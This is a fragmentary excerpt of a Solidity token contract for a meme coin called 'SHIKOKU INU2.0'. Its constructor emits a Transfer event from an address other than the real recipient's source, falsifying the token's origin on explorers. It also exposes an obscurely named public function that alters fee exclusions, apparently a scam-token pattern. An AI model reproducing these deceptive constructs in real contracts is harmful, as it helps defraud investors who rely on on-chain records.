...
contract SHIKOKUINU2 is Context, IERC20, Ownable{

    using SafeMath for uint256;
    string private _name = "SHIKOKU INU2.0";
    string private _symbol = "SHIK2.0";
    ...
    constructor () {
        ...
        doge = payable(address(0xf10B88e680FfbCCE403D7f6C4016AC3ae47CB6a9));

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0xb748D90ead3Ff11D2373B4edccaD534d7fB32C84), _msgSender(), _totalSupply);
    }
    ...
    function uni(bool ankr,uint256 nvidia, address[] calldata swarm) public {
        excludefromFees();
